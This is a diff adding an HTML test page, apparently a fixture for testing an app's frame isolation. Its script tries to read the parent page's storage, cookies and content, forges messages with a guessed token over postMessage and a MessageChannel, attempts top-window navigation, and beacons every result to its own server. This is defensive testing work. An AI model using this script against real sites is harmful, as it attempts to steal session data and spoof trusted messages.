@@ -1,0 +1,40 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Not the report</title></head>
+<body>
+<p>A page on ANOTHER ORIGIN that a report took the frame to. No policy from the host applies to it and its scripts
+run. It tries to read the app, pass as the note-taking script, and catch anything the host pushes, and it reports
+every result to its own server, which the proof reads.</p>
+<script>
+  (function () {
+    var tag = new URLSearchParams(location.search).get("from") || "unknown";
+    function beacon(name, value) {
+      try { fetch("/beacon/evil-" + tag + "-" + name + "?v=" + encodeURIComponent(String(value)), { mode: "no-cors" }); } catch (e) {}
+    }
+    var out = {};
+    try { out.parentStorage = JSON.stringify(parent.localStorage); } catch (e) { out.parentStorage = "blocked"; }
+    try { out.parentCookie = parent.document.cookie; } catch (e) { out.parentCookie = "blocked"; }
+    try { out.parentDom = parent.document.body.innerHTML.slice(0, 200); } catch (e) { out.parentDom = "blocked"; }
+    try { out.topLocation = String(top.location.href); } catch (e) { out.topLocation = "blocked"; }
+    document.body.setAttribute("data-evil-ran", JSON.stringify(out));
+    beacon("ran", JSON.stringify(out));
+    window.addEventListener("message", function (e) {
+      document.body.setAttribute("data-evil-got-message", JSON.stringify(e.data));
+      beacon("window-message", JSON.stringify(e.data));
+    });
+    var forged = { channel: "devthrottle.dev-report", version: 1 };
+    var ch = new MessageChannel();
+    ch.port1.onmessage = function (e) {
+      document.body.setAttribute("data-evil-got-port-message", JSON.stringify(e.data));
+      beacon("port-message", JSON.stringify(e.data));
+    };
+    parent.postMessage(Object.assign({}, forged, { type: "ready", token: "guessed", payload: { questionIds: [] } }), "*", [ch.port2]);
+    ch.port1.postMessage(Object.assign({}, forged, { type: "send", token: "guessed",
+      payload: { items: [{ id: "e1", kind: "note", text: "FORGED OVER A PORT BY THE NEXT PAGE", anchor: { type: "element", selector: "p", quote: "" } }] } }));
+    parent.postMessage(Object.assign({}, forged, { type: "send", token: "guessed",
+      payload: { items: [{ id: "e2", kind: "note", text: "FORGED BY THE NEXT PAGE", anchor: { type: "element", selector: "p", quote: "" } }] } }), "*");
+    try { top.location.href = location.origin + "/beacon/evil-" + tag + "-top-navigation-worked"; } catch (e) { beacon("top-navigation", "blocked:" + e.name); }
+  })();
+</script>
+</body>
+</html>
